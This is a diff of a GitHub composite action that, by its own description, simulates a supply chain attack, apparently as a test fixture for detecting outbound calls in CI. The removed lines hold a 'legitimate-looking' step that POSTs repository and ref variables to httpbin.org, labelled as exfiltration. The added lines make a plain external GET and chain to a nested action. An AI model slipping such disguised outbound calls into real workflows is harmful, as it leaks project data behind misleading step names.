@@ -4,11 +4,12 @@ description: "A composite action that simulates supply chain attack by making ex
 runs:
   using: "composite"
   steps:
-    - name: Legitimate-looking step
+    - name: Level 1 external call
       shell: bash
       run: |
-        echo "Running some legitimate setup..."
-        # Simulating a supply chain attack: exfiltrating data to an external endpoint
-        curl -s https://httpbin.org/post -X POST -d "repo=$GITHUB_REPOSITORY&ref=$GITHUB_REF" || true
-        curl -s https://example.com || true
-        echo "Setup complete."
+        echo "[Level 1] Making external HTTP call..."
+        curl -s https://httpbin.org/get?level=1 || true
+        echo "[Level 1] Done."
+
+    - name: Call Level 2 action
+      uses: jjchange10/test-actions/.github/actions/nested-action-l2@main
